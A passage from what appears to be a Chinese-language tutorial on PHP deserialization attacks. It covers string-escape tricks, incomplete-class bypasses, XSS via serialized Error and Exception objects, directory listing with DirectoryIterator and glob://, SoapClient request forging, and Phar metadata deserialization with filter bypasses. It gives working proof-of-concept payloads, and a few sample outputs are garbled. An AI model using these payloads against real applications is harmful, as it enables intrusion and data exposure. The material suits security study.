class="keyword">echo</span> <span class="string">&quot;&lt;br/&gt;此时age=<span class="subst">$new</span>[1]&quot;</span>;</span><br></pre></td></tr></table></figure><p>正常情况,传入<code>name=mao</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串: string(38)&quot;a:2:&#123;i:0;s:3:&quot;mao&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">过滤后:array(2)&#123;[0]=&gt; string(3)&quot;mao&quot;[1]=&gt;string(7) &quot;I am 11&quot;&#125;</span><br><span class="line">此时，age=I am 11</span><br></pre></td></tr></table></figure><p>如果此时多传入一个x，反序列化失败，由于溢出(s本来是4，多了一个字符出来)，我们可以利用这一点实现字符串逃逸。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串: string(39) &quot;a:2:&#123;i:O;s:4:&quot;maox&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</span><br><span class="line">过滤后:bool(false)</span><br><span class="line">此时，age=</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串:string(79)&quot;a:2:0i:0;s:43:&quot;maoxxxxxx00x0xxoxxxxx&quot;;i:1;s:6:&quot;woaini7&quot;;&#125;&quot;;i:1;s:7:&quot;l am 11&quot;;)&quot;</span><br><span class="line">过滤后:array(2)&#123;[0]=&gt;string(43)&quot;maoxxx808x88x883800x80000008xxxxxxxxxx”[1]=&gt; string(6)&quot;woaini&quot;&#125;)</span><br><span class="line">此时，age=woaini</span><br></pre></td></tr></table></figure><p>传入</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">name=maoxxxxxxxxxxxxxxxxxxxx&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</span><br><span class="line">&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</span><br></pre></td></tr></table></figure><p>这一部分一共二十个字符，由于一个x会被替换为两个，一共输入了20个x，现在是40个，多出来的20个x取代了这二十个字符<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>，从而造成<code>&quot;;i:1;s:6:&quot;woaini&quot;;&#125;</code>的溢出，而<code>&quot;</code>闭合了前串，使字符串成功逃逸，可以被反序列化，输出<code>woaini</code>。<br>最后的<code>;&#125;</code>闭合反序列化全过程导致原来的<code>&quot;;i:1;s:7:&quot;I am 11&quot;;&#125;&quot;</code>被舍弃，不影响反序列化过程</p><h5 id="情况2：过滤后字符变少"><a href="#情况2：过滤后字符变少" class="headerlink" title="情况2：过滤后字符变少"></a>情况2：过滤后字符变少</h5><p>把反序列化后的两个x替换成为一个</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">function change($str)&#123;</span><br><span class="line">    return str_replace(&quot;xx&quot;,&quot;x&quot;,$str);</span><br><span class="line">&#125;</span><br><span class="line">$arr[&#x27;name&#x27;] = $_GET[&#x27;name&#x27;];</span><br><span class="line">$arr[&#x27;age&#x27;] = $_GET[&#x27;age&#x27;];</span><br><span class="line">echo &quot;反序列化字符串：&quot;;</span><br><span class="line">var_dump(serialize($arr));</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">echo &quot;过滤后:&quot;;</span><br><span class="line">$old = change(serialize($arr));</span><br><span class="line">var_dump($old);</span><br><span class="line">echo &quot;&lt;br/&gt;&quot;;</span><br><span class="line">$new = unserialize($old);</span><br><span class="line">var_dump($new);</span><br><span class="line">echo &quot;&lt;br/&gt;此时，age=&quot;;</span><br><span class="line">echo $new[&#x27;age&#x27;];</span><br></pre></td></tr></table></figure><p><code>正常情况传入name=mao&amp;age=11</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">反序列化字符串:string(46)&quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;&quot;;)&quot;</span><br><span class="line">过滤后:string(46)&quot;a:2:&#123;s:4:&quot;name&quot;;s:3:&quot;mao&quot;;s:3:&quot;age&quot;;s:2:&quot;11&quot;;&#125;”</span><br><span class="line">array(2)&#123;[&quot;name&quot;]=&gt;string(3)&quot;mao&quot;[&quot;age&quot;]=&gt;string(2)&quot;11&quot;&#125;</span><br><span class="line">此时,age=11</span><br></pre></td></tr></table></figure><p>前面少了一半，导致后面的字符覆盖，从而执行了后面的代码；<br>这部分是age序列化后的结果</p><p><code>s:3:&quot;age&quot;;s:28:&quot;11&quot;;s:3:&quot;age&quot;;s:6:&quot;woaini&quot;;&#125;&quot;</code></p><p>由于前面是40个x所以导致少了20个字符，所以需要后面来补上，<code>&quot;;s:3:&quot;age&quot;;s:28:&quot;11</code>这一部分刚好20个，后面由于有<code>&quot;</code>闭合了前面因此后面的参数就可以由我们自定义执行了</p><h4 id="利用不完整类绕过序列化"><a href="#利用不完整类绕过序列化" class="headerlink" title="利用不完整类绕过序列化"></a>利用不完整类绕过序列化</h4><p>当存在 <code>serialize(unserialize($x)) != $x</code> 时, 可以利用不完整类 <code>__PHP_Incomplete_Class</code> 来进行处理。</p><p>当我们尝试反序列化到一个不存在的类时, PHP 会使用 <code>__PHP_Incomplete_Class_Name</code> 这个追加的字段来进行存储。我们于是可以尝试自己构造一个不完整类</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$raw</span> = <span class="string">&#x27;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;s:27:&quot;__PHP_Incomplete_Class_Name&quot;;s:1:&quot;F&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$exp</span> = <span class="string">&#x27;O:1:&quot;F&quot;:1:&#123;s:1:&quot;a&quot;;s:1:&quot;b&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">serialize</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$raw</span>)) == <span class="variable">$exp</span>); <span class="comment">// true</span></span><br></pre></td></tr></table></figure><p>绕过。</p><p>更进一步, 我们可以通过这个让一个对象被调用后凭空消失, 只需要手动构造无<code>__PHP_Incomplete_Class_Name</code>的不完整对象</p><p>PHP 会先把他的属性给创建好, 但是在创建好最后一个属性后并未发现 <code>__PHP_Incomplete_Class_Name</code>, 于是会将前面创建的所有的属性回收并引发 <code>__destruct</code>。</p><h2 id="反序列化利用"><a href="#反序列化利用" class="headerlink" title="反序列化利用"></a>反序列化利用</h2><h3 id="原生类反序列化利用"><a href="#原生类反序列化利用" class="headerlink" title="原生类反序列化利用*"></a>原生类反序列化利用*</h3><h4 id="Error"><a href="#Error" class="headerlink" title="Error"></a>Error</h4><p>Error类是php的一个内置类，用于自动自定义一个Error，在php7的环境下可能会造成一个xss漏洞，因为它内置有一个 <code>__toString()</code> 的方法，常用于PHP 反序列化中。</p><p>如果有个POP链走到一半就走不通了，不如尝试利用这个来做一个xss，也可以直接使用 <code>echo &lt;Object&gt;</code> 的写法，当 PHP 对象被当作一个字符串输出或使用时候（如<code>echo</code>的时候）会触发<code>__toString</code> 方法，这是一种挖洞的新思路。</p><h6 id="类摘要"><a href="#类摘要" class="headerlink" title="类摘要"></a><strong>类摘要</strong></h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Error</span> <span class="keyword">implements</span> <span class="built_in">Throwable</span> &#123;</span><br><span class="line">    <span class="comment">/* 属性 */</span></span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$message</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$code</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">string</span> <span class="variable">$file</span> ;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">int</span> <span class="variable">$line</span> ;</span><br><span class="line">    <span class="comment">/* 方法 */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__construct</span> ( <span class="keyword">string</span> <span class="variable">$message</span> = <span class="string">&quot;&quot;</span> , <span class="keyword">int</span> <span class="variable">$code</span> = <span class="number">0</span> , <span class="built_in">Throwable</span> <span class="variable">$previous</span> = <span class="literal">null</span> )</span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getMessage</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getPrevious</span> ( ) : <span class="built_in">Throwable</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getCode</span> ( ) : <span class="keyword">mixed</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getFile</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getLine</span> ( ) : <span class="keyword">int</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTrace</span> ( ) : <span class="keyword">array</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">public</span> <span class="title function_ invoke__">getTraceAsString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_ invoke__">__toString</span> ( ) : <span class="keyword">string</span></span><br><span class="line">    <span class="keyword">final</span> <span class="keyword">private</span> <span class="title function_ invoke__">__clone</span> ( ) : <span class="keyword">void</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="类属性"><a href="#类属性" class="headerlink" title="类属性"></a><strong>类属性</strong></h6><ul><li>message：错误消息内容</li><li>code：错误代码</li><li>file：抛出错误的文件名</li><li>line：抛出错误在该文件中的行数</li></ul><h6 id="类方法"><a href="#类方法" class="headerlink" title="类方法"></a><strong>类方法</strong></h6><ul><li><a href="https://www.php.net/manual/zh/error.construct.php"><code>Error::__construct</code></a> — 初始化 error 对象</li><li><a href="https://www.php.net/manual/zh/error.getmessage.php"><code>Error::getMessage</code></a> — 获取错误信息</li><li><a href="https://www.php.net/manual/zh/error.getprevious.php"><code>Error::getPrevious</code></a> — 返回先前的 Throwable</li><li><a href="https://www.php.net/manual/zh/error.getcode.php"><code>Error::getCode</code></a> — 获取错误代码</li><li><a href="https://www.php.net/manual/zh/error.getfile.php"><code>Error::getFile</code></a> — 获取错误发生时的文件</li><li><a href="https://www.php.net/manual/zh/error.getline.php"><code>Error::getLine</code></a> — 获取错误发生时的行号</li><li><a href="https://www.php.net/manual/zh/error.gettrace.php"><code>Error::getTrace</code></a> — 获取调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.gettraceasstring.php"><code>Error::getTraceAsString</code></a> — 获取字符串形式的调用栈（stack trace）</li><li><a href="https://www.php.net/manual/zh/error.tostring.php"><code>Error::__toString</code></a> — error 的字符串表达</li><li><a href="https://www.php.net/manual/zh/error.clone.php"><code>Error::__clone</code></a> — 克隆 error</li></ul><h6 id="使用-Error-内置类构造XSS"><a href="#使用-Error-内置类构造XSS" class="headerlink" title="使用 Error 内置类构造XSS"></a>使用 Error 内置类构造XSS</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>&#x2F;&#x2F;一个反序列化函数，但是没有进行反序列化的类，反序列化但没有POP链的情况只能找到PHP内置类来进行反序列化</p><h6 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Error</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A5%3A%22Error%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A13%3A%22%00Error%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A12%3A%22%00Error%00trace%22%3Ba%3A0%3A%7B%7Ds%3A15%3A%22%00Error%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><h4 id="Exception"><a href="#Exception" class="headerlink" title="Exception"></a>Exception</h4><h6 id="类摘要-1"><a href="#类摘要-1" class="headerlink" title="类摘要"></a><strong>类摘要</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Exception &#123;</span><br><span class="line">    /* 属性 */</span><br><span class="line">    protected string $message ;</span><br><span class="line">    protected int $code ;</span><br><span class="line">    protected string $file ;</span><br><span class="line">    protected int $line ;</span><br><span class="line">    /* 方法 */</span><br><span class="line">    public __construct ( string $message = &quot;&quot; , int $code = 0 , Throwable $previous = null )</span><br><span class="line">    final public getMessage ( ) : string</span><br><span class="line">    final public getPrevious ( ) : Throwable</span><br><span class="line">    final public getCode ( ) : mixed</span><br><span class="line">    final public getFile ( ) : string</span><br><span class="line">    final public getLine ( ) : int</span><br><span class="line">    final public getTrace ( ) : array</span><br><span class="line">    final public getTraceAsString ( ) : string</span><br><span class="line">    public __toString ( ) : string</span><br><span class="line">    final private __clone ( ) : void</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h6 id="类属性-1"><a href="#类属性-1" class="headerlink" title="类属性"></a><strong>类属性</strong></h6><ul><li>message：异常消息内容</li><li>code：异常代码</li><li>file：抛出异常的文件名</li><li>line：抛出异常在该文件中的行号</li></ul><h6 id="类方法-1"><a href="#类方法-1" class="headerlink" title="类方法"></a><strong>类方法</strong></h6><ul><li><a href="https://www.php.net/manual/zh/exception.construct.php"><code>Exception::__construct</code></a> — 异常构造函数</li><li><a href="https://www.php.net/manual/zh/exception.getmessage.php"><code>Exception::getMessage</code></a> — 获取异常消息内容</li><li><a href="https://www.php.net/manual/zh/exception.getprevious.php"><code>Exception::getPrevious</code></a> — 返回异常链中的前一个异常</li><li><a href="https://www.php.net/manual/zh/exception.getcode.php"><code>Exception::getCode</code></a> — 获取异常代码</li><li><a href="https://www.php.net/manual/zh/exception.getfile.php"><code>Exception::getFile</code></a> — 创建异常时的程序文件名称</li><li><a href="https://www.php.net/manual/zh/exception.getline.php"><code>Exception::getLine</code></a> — 获取创建的异常所在文件中的行号</li><li><a href="https://www.php.net/manual/zh/exception.gettrace.php"><code>Exception::getTrace</code></a> — 获取异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.gettraceasstring.php"><code>Exception::getTraceAsString</code></a> — 获取字符串类型的异常追踪信息</li><li><a href="https://www.php.net/manual/zh/exception.tostring.php"><code>Exception::__toString</code></a> — 将异常对象转换为字符串</li><li><a href="https://www.php.net/manual/zh/exception.clone.php"><code>Exception::__clone</code></a> — 异常克隆</li></ul><h6 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>]);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h6 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;script&gt;alert(&#x27;xss&#x27;)&lt;/script&gt;&quot;</span>);</span><br><span class="line"><span class="variable">$b</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$b</span>);  </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//输出: O%3A9%3A%22Exception%22%3A7%3A%7Bs%3A10%3A%22%00%2A%00message%22%3Bs%3A25%3A%22%3Cscript%3Ealert%281%29%3C%2Fscript%3E%22%3Bs%3A17%3A%22%00Exception%00string%22%3Bs%3A0%3A%22%22%3Bs%3A7%3A%22%00%2A%00code%22%3Bi%3A0%3Bs%3A7%3A%22%00%2A%00file%22%3Bs%3A18%3A%22%2Fusercode%2Ffile.php%22%3Bs%3A7%3A%22%00%2A%00line%22%3Bi%3A2%3Bs%3A16%3A%22%00Exception%00trace%22%3Ba%3A0%3A%7B%7Ds%3A19%3A%22%00Exception%00previous%22%3BN%3B%7D</span></span><br></pre></td></tr></table></figure><h4 id="DirectoryIterator"><a href="#DirectoryIterator" class="headerlink" title="DirectoryIterator"></a>DirectoryIterator</h4><p>DirectoryIterator 类提供了一个用于查看文件系统目录内容的简单接口，该类是在 PHP 5 中增加的一个类。DirectoryIterator与glob:&#x2F;&#x2F;协议结合将无视open_basedir对目录的限制，可以用来列举出指定目录下的文件。</p><h6 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h6><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$dir</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;whoami&#x27;</span>];</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="variable">$dir</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># payload一句话的形式:</span></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);<span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;<span class="title function_ invoke__">__toString</span>().<span class="string">&#x27;&lt;br&gt;&#x27;</span>);&#125;</span><br></pre></td></tr></table></figure><p>输入 <code>/?whoami=glob:///*</code> 可列出根目录下的文件。</p><p>只能列根目录和open_basedir指定的目录的文件，不能列出其他目录中的文件，且不能读取文件内容。</p><h4 id="SoapClient"><a href="#SoapClient" class="headerlink" title="SoapClient"></a>SoapClient</h4><p><code>php</code>在安装<code>php-soap</code>拓展后，可以反序列化原生类<code>SoapClient</code>，来发送<code>http post</code>请求。</p><p><code>SoapClient</code> 可以进行 <code>HTTP/HTTPS</code> 的请求, 但是不会输出服务端输出的内容. 不过, 我们仍然可以利用这个来进行内网渗透。</p><p>我们通过上面的脚本可以找到 <code>SoapClient</code> 类中存在 <code>SoapClient::__call</code>, 当我们调用一个不存在的方法时会转发到此方法, 同时请求给服务端</p><p>对于 <code>SoapClient</code> 的反序列化, 我们可以控制很多地方的参数,</p><ul><li><code>location</code> (<code>SoapClientlocation</code>),这样就可以发送请求到指定服务器</li><li><code>uri</code> (<code>SoapClienturi</code>), 由于这一串最后会到 Header 里的 <code>SOAPAction</code>, 我们可以在这里注入换行来新建 Header 项, 注意这里的会自动给传入的内容包裹上双引号</li><li><code>useragent</code> (<code>SoapClient_user_agent</code>), 由于 <code>User-Agent</code> 段在 <code>Content-Type</code> 的上方, 我们可以通过对 <code>useragent</code> 换行来覆盖掉默认的 <code>text/xml</code> 的请求类型. 由于默认是 POST 请求, 结合起来我们就可以对指定服务器发送任意 POST 请求。</li></ul><h3 id="Phar-反序列化"><a href="#Phar-反序列化" class="headerlink" title="Phar 反序列化"></a>Phar 反序列化</h3><h4 id="phar文件"><a href="#phar文件" class="headerlink" title="phar文件"></a><code>phar</code>文件</h4><p><code>phar</code>文件本质上是一种压缩文件，会以序列化的形式存储用户自定义的<code>meta-data</code>。当受影响的文件操作函数调用<code>phar</code>文件时，会自动反序列化<code>meta-data</code>内的内容。</p><p>在软件中，<code>PHAR</code>（<code>PHP</code>归档）文件是一种打包格式，通过将许多<code>PHP</code>代码文件和其他资源（例如图像，样式表等）捆绑到一个归档文件中来实现应用程序和库的分发</p><p>php通过用户定义和内置的“流包装器”实现复杂的文件处理功能。内置包装器可用于文件系统函数，如<code>fopen()</code>,<code>copy()</code>,<code>file_exists()</code>和<code>filesize()</code>。 <code>phar://</code>就是一种内置的流包装器。</p><h4 id="常见的流包装器"><a href="#常见的流包装器" class="headerlink" title="常见的流包装器"></a>常见的流包装器</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">file:<span class="comment">// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span></span><br><span class="line">http:<span class="comment">// — 访问 HTTP(s) 网址</span></span><br><span class="line">ftp:<span class="comment">// — 访问 FTP(s) URLs</span></span><br><span class="line">php:<span class="comment">// — 访问各个输入/输出流（I/O streams）</span></span><br><span class="line">zlib:<span class="comment">// — 压缩流</span></span><br><span class="line">data:<span class="comment">// — 数据（RFC 2397）</span></span><br><span class="line">glob:<span class="comment">// — 查找匹配的文件路径模式</span></span><br><span class="line">phar:<span class="comment">// — PHP 归档</span></span><br><span class="line">ssh2:<span class="comment">// — Secure Shell 2</span></span><br><span class="line">rar:<span class="comment">// — RAR</span></span><br><span class="line">ogg:<span class="comment">// — 音频流</span></span><br><span class="line">expect:<span class="comment">// — 处理交互式的流</span></span><br></pre></td></tr></table></figure><h4 id="phar文件结构"><a href="#phar文件结构" class="headerlink" title="phar文件结构"></a>phar文件结构</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">stub:phar文件的标志，必须以 xxx <span class="title function_ invoke__">__HALT_COMPILER</span>();<span class="meta">?&gt;</span> 结尾，否则无法识别。xxx可以为自定义内容。</span><br><span class="line">manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</span><br><span class="line">content:被压缩文件的内容</span><br><span class="line"><span class="title function_ invoke__">signature</span>(可空):签名，放在末尾。</span><br></pre></td></tr></table></figure><h4 id="生成一个phar文件"><a href="#生成一个phar文件" class="headerlink" title="生成一个phar文件"></a>生成一个phar文件</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Test</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="title function_ invoke__">unlink</span>(<span class="string">&quot;phar.phar&quot;</span>);</span><br><span class="line">    <span class="variable">$phar</span> = <span class="keyword">new</span> <span class="title class_">Phar</span>(<span class="string">&quot;phar.phar&quot;</span>); <span class="comment">//后缀名必须为phar</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">startBuffering</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setStub</span>(<span class="string">&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;</span>); <span class="comment">//设置stub</span></span><br><span class="line">    <span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">setMetadata</span>(<span class="variable">$o</span>); <span class="comment">//将自定义的meta-data存入manifest</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">addFromString</span>(<span class="string">&quot;test.txt&quot;</span>, <span class="string">&quot;test&quot;</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">    <span class="comment">//签名自动计算</span></span><br><span class="line">    <span class="variable">$phar</span>-&gt;<span class="title function_ invoke__">stopBuffering</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h4 id="漏洞利用条件"><a href="#漏洞利用条件" class="headerlink" title="漏洞利用条件"></a>漏洞利用条件</h4><p>phar文件要能够上传到服务器端。<br>要有可用的魔术方法作为“跳板”。<br>文件操作函数的参数可控，且<code>:</code>、<code>/</code>、<code>phar</code>等特殊字符没有被过滤。</p><h4 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a><strong>绕过方式</strong></h4><p>当环境限制了<code>phar</code>不能出现在前面的字符里。可以使用<code>compress.bzip2://</code>和<code>compress.zlib://</code>等绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.bzip2:<span class="comment">//phar:///test.phar/test.txt</span></span><br><span class="line">compress.zlib:<span class="comment">//phar:///home/sx/test.phar/test.txt</span></span><br><span class="line">php:<span class="comment">//filter/resource=phar:///test.phar/test.txt</span></span><br></pre></td></tr></table></figure><p>当环境限制了<code>phar</code>不能出现在前面的字符里，还可以配合其他协议进行利用。<br><code>php://filter/read=convert.base64-encode/resource=phar://phar.phar</code></p><p>GIF格式验证可以通过在文件头部添加<code>GIF89a</code>绕过<br>1、<code>$phar-&gt;setStub(“GIF89a”.“&lt;?php __HALT_COMPILER(); 